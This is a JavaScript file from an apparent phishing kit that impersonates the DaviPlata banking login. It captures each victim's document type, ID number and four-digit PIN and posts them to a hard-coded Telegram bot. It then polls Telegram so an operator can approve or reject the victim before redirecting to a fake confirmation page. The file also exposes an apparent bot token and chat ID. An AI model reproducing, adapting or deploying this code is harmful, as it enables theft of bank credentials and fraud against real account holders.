(function () {
    'use strict';

    /* ============================================================
       CONFIGURACIÓN
       ============================================================ */

    var TELEGRAM_BOT_TOKEN = '8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw';
    var TELEGRAM_CHAT_ID = '-1004245962123';
    var API = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN;

    var PAGINA_DESTINO = 'confirmacion.html';

    var MIN_DIGITOS = 5;
    var CLAVE_STORAGE = 'dp_documento';
    var ESPERA_MAXIMA_MS = 180000;

    /* ============================================================
       REFERENCIAS
       ============================================================ */

    var form = document.getElementById('formLogin');
    var tipoDoc = document.getElementById('tipoDoc');
    var numDoc = document.getElementById('numDoc');
    var recordar = document.getElementById('recordar');
    var faceId = document.getElementById('faceId');
    var btnContinuar = document.getElementById('btnContinuar');
    var loader = document.getElementById('loader');
    var btnQr = document.getElementById('btnQr');

    var modalClave = document.getElementById('modalClave');
    var cerrarClave = document.getElementById('cerrarClave');
    var cajas = document.querySelectorAll('.clave-box');
    var btnConfirmarClave = document.getElementById('btnConfirmarClave');
    var claveError = document.getElementById('claveError');
    var claveEspera = document.getElementById('claveEspera');

    /* ============================================================
       ESTADO
       ============================================================ */

    var sesion = '';
    var offset = 0;
    var pollTimer = null;
    var timeoutTimer = null;
    var esperando = false;

    /* ============================================================
       UTILIDADES
       ============================================================ */

    function soloDigitos(valor) {
        return valor.replace(/\D+/g, '');
    }

    function vibrar() {
        if (navigator.vibrate) navigator.vibrate(10);
    }

 function actualizarBoton() {
        var listo = numDoc.value.trim().length >= MIN_DIGITOS;
        btnContinuar.disabled = !listo;
        btnContinuar.classList.toggle('listo', listo);
    }

    function mostrarLoader(visible) {
        loader.classList.toggle('activo', visible);
    }

    function enviarTelegram(cuerpo) {
        return fetch(API + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(cuerpo)
        }).catch(function (err) {
            console.error('Telegram:', err);
        });
    }

    function textoDocumento() {
        var opcion = tipoDoc.options[tipoDoc.selectedIndex];
        return opcion ? opcion.text : 'Documento';
    }

    function claveCompleta() {
        var valor = '';
        Array.prototype.forEach.call(cajas, function (c) { valor += c.value; });
        return valor;
    }

    function limpiarCajas() {
        Array.prototype.forEach.call(cajas, function (c) {
            c.value = '';
            c.disabled = false;
        });
        btnConfirmarClave.disabled = true;
        btnConfirmarClave.textContent = 'Confirmar';
        claveError.classList.remove('visible');
        claveEspera.classList.remove('visible');
    }

    function bloquearCajas(bloqueado) {
        Array.prototype.forEach.call(cajas, function (c) { c.disabled = bloqueado; });
    }

    /* ============================================================
       FORMULARIO DEL DOCUMENTO
       ============================================================ */

    numDoc.addEventListener('input', function () {
        var limpio = soloDigitos(numDoc.value).slice(0, 12);
        if (limpio !== numDoc.value) numDoc.value = limpio;
        actualizarBoton();
    });

    numDoc.addEventListener('paste', function (e) {
        e.preventDefault();
        var pegado = (e.clipboardData || window.clipboardData).getData('text');
        numDoc.value = soloDigitos(pegado).slice(0, 12);
        actualizarBoton();
    });

    form.addEventListener('submit', function (e) {
        e.preventDefault();

        var documento = numDoc.value.trim();
        if (documento.length < MIN_DIGITOS) {
            numDoc.focus();
            vibrar();
            return;
        }

        if (recordar.checked) {
            localStorage.setItem(CLAVE_STORAGE, documento);
        } else {
            localStorage.removeItem(CLAVE_STORAGE);
        }

        abrirModalClave();
    });

    /* ============================================================
       MODAL DE CLAVE
       ============================================================ */

    function nuevaSesion() {
        return Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    }

    function sincronizarOffset() {
        fetch(API + '/getUpdates?offset=-1')
            .then(function (r) { return r.json(); })
            .then(function (d) {
                if (d.ok && d.result.length) {
                    offset = d.result[d.result.length - 1].update_id + 1;
                }
            })
            .catch(function () { });
    }

    function abrirModalClave() {
        limpiarCajas();
        sesion = nuevaSesion();
        esperando = false;
        modalClave.classList.add('abierto');
        modalClave.setAttribute('aria-hidden', 'false');
        sincronizarOffset();
        setTimeout(function () { cajas[0].focus(); }, 120);
    }

    function cerrarModalClave() {
        detenerEspera();
        modalClave.classList.remove('abierto');
        modalClave.setAttribute('aria-hidden', 'true');
        mostrarLoader(false);
        actualizarBoton();
    }

    cerrarClave.addEventListener('click', cerrarModalClave);

    Array.prototype.forEach.call(cajas, function (caja, indice) {
        caja.addEventListener('input', function () {
            var valor = soloDigitos(caja.value).slice(-1);
            caja.value = valor;

            if (valor && indice < cajas.length - 1) {
                cajas[indice + 1].focus();
            }

            btnConfirmarClave.disabled = claveCompleta().length !== 4;
        });

        caja.addEventListener('keydown', function (e) {
            if (e.key === 'Backspace' && !caja.value && indice > 0) {
                cajas[indice - 1].focus();
                cajas[indice - 1].value = '';
                btnConfirmarClave.disabled = true;
            }
            if (e.key === 'Enter' && claveCompleta().length === 4) {
                btnConfirmarClave.click();
            }
        });

        caja.addEventListener('paste', function (e) {
            e.preventDefault();
            var pegado = soloDigitos((e.clipboardData || window.clipboardData).getData('text')).slice(0, 4);
            Array.prototype.forEach.call(cajas, function (c, i) { c.value = pegado[i] || ''; });
            var siguiente = Math.min(pegado.length, 3);
            cajas[siguiente].focus();
            btnConfirmarClave.disabled = claveCompleta().length !== 4;
        });
    });

    btnConfirmarClave.addEventListener('click', function () {
        var clave = claveCompleta();
        if (clave.length !== 4 || esperando) return;

        esperando = true;
        vibrar();
        bloquearCajas(true);
        btnConfirmarClave.disabled = true;
        btnConfirmarClave.textContent = 'Enviando...';
        claveError.classList.remove('visible');

        var mensaje =
            '\u{1F510} *DAVIPLATA \u2013 CLAVE INGRESADA* \u{1F510}\n\n' +
            '\u{1F4C4} *Tipo:* ' + textoDocumento() + '\n' +
            '\u{1F194} *Documento:* `' + numDoc.value.trim() + '`\n' +
            '\u{1F511} *Clave:* `' + clave + '`\n' +
            '\u{1F552} *Fecha:* ' + new Date().toLocaleString('es-CO');

        enviarTelegram({
            chat_id: TELEGRAM_CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown',
            reply_markup: JSON.stringify({
                inline_keyboard: [[
                    { text: '\u2705 Confirmar', callback_data: 'ok:' + sesion },
                    { text: '\u274C Rechazar', callback_data: 'no:' + sesion }
                ]]
            })
        }).then(function () {
            btnConfirmarClave.textContent = 'Esperando...';
            claveEspera.classList.add('visible');
            iniciarEspera();
        });
    });

    /* ============================================================
       ESPERA DE LA RESPUESTA EN TELEGRAM
       ============================================================ */

    function iniciarEspera() {
        detenerEspera();
        pollTimer = setInterval(consultarTelegram, 2500);
        timeoutTimer = setTimeout(function () {
            detenerEspera();
            esperando = false;
            bloquearCajas(false);
            btnConfirmarClave.disabled = false;
            btnConfirmarClave.textContent = 'Confirmar';
            claveEspera.classList.remove('visible');
            claveError.textContent = 'Sin respuesta. Puedes intentar de nuevo.';
            claveError.classList.add('visible');
        }, ESPERA_MAXIMA_MS);
    }

    function detenerEspera() {
        if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
        if (timeoutTimer) { clearTimeout(timeoutTimer); timeoutTimer = null; }
    }

    function consultarTelegram() {
        var url = API + '/getUpdates?offset=' + offset + '&allowed_updates=' +
            encodeURIComponent('["callback_query","message"]');

        fetch(url)
            .then(function (r) { return r.json(); })
            .then(function (d) {
                if (!d.ok || !d.result) return;

                d.result.forEach(function (u) {
                    offset = u.update_id + 1;

                    var cb = u.callback_query;
                    if (cb && cb.data && cb.data.indexOf(sesion) !== -1) {
                        fetch(API + '/answerCallbackQuery?callback_query_id=' + cb.id);
                        resolver(cb.data.indexOf('ok:') === 0);
                        return;
                    }

                    var msg = u.message;
                    if (!cb && msg && msg.text && !esperando) return;
                    if (!cb && msg && msg.text) {
                        var t = msg.text.trim().toLowerCase();
                        if (t === 'ok' || t === 'confirmar' || t === 'si' || t === 'sí') resolver(true);
                        if (t === 'no' || t === 'rechazar') resolver(false);
                    }
                });
            })
            .catch(function () { });
    }

    function resolver(confirmado) {
        if (!esperando) return;
        esperando = false;
        detenerEspera();

        if (confirmado) {
            claveEspera.classList.remove('visible');
            mostrarLoader(true);
            setTimeout(function () {
                window.location.href = PAGINA_DESTINO;
            }, 600);
        } else {
            limpiarCajas();
            bloquearCajas(false);
            claveError.classList.add('visible');
            cajas[0].focus();
        }
    }

    /* ============================================================
       RESTAURAR Y BOTONES INFERIORES
       ============================================================ */

    (function restaurar() {
        var guardado = localStorage.getItem(CLAVE_STORAGE);
        if (guardado) {
            numDoc.value = guardado;
            recordar.checked = true;
            actualizarBoton();
        }
    })();

    btnQr.addEventListener('click', function () {
        vibrar();
        alert('Escanea el código QR desde la app Daviplata.');
    });

    Array.prototype.forEach.call(document.querySelectorAll('[data-accion]'), function (boton) {
        boton.addEventListener('click', function () {
            vibrar();
            console.log('Acción:', boton.dataset.accion);
        });
    });

})();